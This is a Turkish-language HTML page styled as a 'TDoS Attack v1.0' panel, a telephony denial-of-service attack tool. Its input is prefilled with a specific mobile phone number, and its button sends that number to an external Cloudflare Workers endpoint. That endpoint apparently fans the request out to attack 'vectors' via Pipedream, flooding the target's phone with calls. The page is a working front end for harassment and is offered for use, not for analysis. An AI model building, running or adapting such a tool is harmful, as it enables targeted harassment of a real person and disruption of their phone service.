<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Siber Güvenlik | TDoS Saldırı Paneli</title>
    <style>
        body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .terminal { border: 2px solid #00ff41; padding: 40px; box-shadow: 0 0 20px #00ff41; width: 450px; text-align: center; background: rgba(0, 0, 0, 0.9); }
        h2 { text-transform: uppercase; letter-spacing: 5px; margin-bottom: 30px; }
        input { background: #000; color: #00ff41; border: 1px solid #00ff41; padding: 12px; width: 85%; margin-bottom: 25px; font-size: 1.3em; text-align: center; outline: none; }
        button { background: #00ff41; color: #000; border: none; padding: 15px 35px; cursor: pointer; font-weight: bold; width: 90%; font-size: 1em; transition: all 0.3s; }
        button:hover { background: #000; color: #00ff41; border: 1px solid #00ff41; box-shadow: 0 0 10px #00ff41; }
        #log { margin-top: 25px; font-size: 0.85em; color: #00ff41; text-align: left; height: 60px; overflow: hidden; border-top: 1px solid #333; padding-top: 10px; }
        .success { color: #fff; font-weight: bold; }
    </style>
</head>
<body>
    <div class="terminal">
        <h2>TDoS ATTACK v1.0</h2>
        <input type="text" id="target" value="05545670469">
        <button onclick="executeAttack()">SALDIRIYI TETIKLE</button>
        <div id="log">Sistem IDLE... <br> Bekleniyor...</div>
    </div>

    <script>
        async function executeAttack() {
            const no = document.getElementById('target').value;
            const log = document.getElementById('log');
            // Senin verdiğin Worker URL'si
            const api_url = "https://empty-firefly-af53.alyux.workers.dev/?numara=" + no;

            log.innerHTML = "[>] İstek paketi hazırlandı...<br>[>] Hedef: " + no;
            
            try {
                const response = await fetch(api_url);
                const data = await response.json();
                
                log.innerHTML = "<span class='success'>[+] DURUM: " + data.mesaj + "</span><br>[+] 10 Vektör Pipedream'e iletildi!";
            } catch (error) {
                log.innerHTML = "<span style='color:red'>[-] HATA: Sunucuya erişilemedi!</span>";
            }
        }
    </script>
</body>
</html>
